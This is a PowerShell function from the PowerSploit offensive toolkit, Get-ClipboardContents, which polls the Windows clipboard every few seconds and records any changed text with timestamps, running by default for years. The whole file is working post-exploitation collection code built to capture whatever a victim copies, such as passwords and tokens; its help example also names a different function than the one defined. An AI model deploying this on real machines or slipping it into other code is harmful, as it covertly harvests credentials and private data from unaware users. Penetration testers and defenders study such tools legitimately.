function Get-ClipboardContents {
<#
.SYNOPSIS
 
Monitors the clipboard on a specified interval for changes to copied text.

PowerSploit Function: Get-ClipboardContents
Author: @harmj0y
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
y
.PARAMETER CollectionLimit

Specifies the interval in minutes to capture clipboard text. Defaults to indefinite collection.

.PARAMETER PollInterval

Interval (in seconds) to check the clipboard for changes, defaults to 15 seconds.

.EXAMPLE

Invoke-ClipboardMonitor -CollectionLimit 120

.LINK

http://brianreiter.org/2010/09/03/copy-and-paste-with-clipboard-from-powershell/
#>

    [CmdletBinding()] Param (
        [Parameter(Position = 1)]
        [UInt32]
        $CollectionLimit,

        [Parameter(Position = 2)]
        [UInt32]
        $PollInterval = 15
    )

    Add-Type -AssemblyName System.Windows.Forms

    # calculate the stop time if one is specified
    if($CollectionLimit) {
        $StopTime = (Get-Date).addminutes($CollectionLimit)
    }
    else {
        $StopTime = (Get-Date).addyears(10)
    }

    $TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
    "=== Get-ClipboardContents Starting at $TimeStamp ===`n"

    # used to check if the contents have changed
    $PrevLength = 0
    $PrevFirstChar = ""

    for(;;){
        if ((Get-Date) -lt $StopTime){

            # stolen/adapted from http://brianreiter.org/2010/09/03/copy-and-paste-with-clipboard-from-powershell/
            $tb = New-Object System.Windows.Forms.TextBox
            $tb.Multiline = $true
            $tb.Paste()

            # only output clipboard data if it's changed
            if (($tb.Text.Length -ne 0) -and ($tb.Text.Length -ne $PrevLength)){
                # if the length isn't 0, the length has changed, and the first character
                # has changed, assume the clipboard has changed
                # YES I know there might be edge cases :)
                if($PrevFirstChar -ne ($tb.Text)[0]){
                    $TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
                    "`n=== $TimeStamp ===`n"
                    $tb.Text
                    $PrevFirstChar = ($tb.Text)[0]
                    $PrevLength = $tb.Text.Length 
                }
            }
        }
        else{
            $TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
            "`n=== Get-ClipboardContents Shutting down at $TimeStamp ===`n"
            Break;
        }
        Start-Sleep -s $PollInterval
    }
}
